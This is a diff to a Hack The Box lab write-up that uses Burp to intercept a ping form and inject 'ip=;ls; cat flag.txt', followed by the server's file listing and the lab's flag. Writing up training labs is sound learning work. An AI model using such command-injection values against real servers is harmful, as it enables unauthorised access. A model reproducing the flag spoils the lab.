@@ -129,7 +129,7 @@ Cheat Sheet
 Solution:- 
 
 1) go to target by searching 94.237.55.61:50073  in search bar
-2) youll see an option "PING 127.0.0.  "  , in that add "1" (127.0.0.1) Now you have your local host ip> now hit the "Ping" button
+2) you'll see an option " PING 127.0.0. _ "  , in that  " _ "  add  "1" (127.0.0.1) Now you have your local host ip(127.0.0.1) > now hit the "Ping" button
 3) Ping req sent to 127.0.0.1> capture it using Burp interceptor> view request :-
 Request for ping 127.0.0.1
 ```
@@ -206,8 +206,11 @@ server.js
 
 ```
 
+
+response gave back list of files
 hence we know code injection exists here,
-now from that response lets read "flag.txt" by changing ==ip=cat flag.txt==
+now from that response lets read "flag.txt" by changing
+==ip=;ls; cat flag.txt== (this command first lists all files, then reads flag.txt file)
 
 request
 ```
@@ -227,5 +230,25 @@ Upgrade-Insecure-Requests: 1
 Sec-GPC: 1
 Priority: u=0, i
 
-ip=cat flag.txt
+ip=;ls; cat flag.txt
 ```
+
+response
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Date: Tue, 01 Apr 2025 17:14:47 GMT
+Connection: keep-alive
+Content-Length: 99
+
+flag.txt
+index.html
+node_modules
+package-lock.json
+public
+server.js
+HTB{1n73rc3p73d_1n_7h3_m1ddl3}
+
+```
+
+Now submit this flag " HTB{1n73rc3p73d_1n_7h3_m1ddl3} " and lab is solved
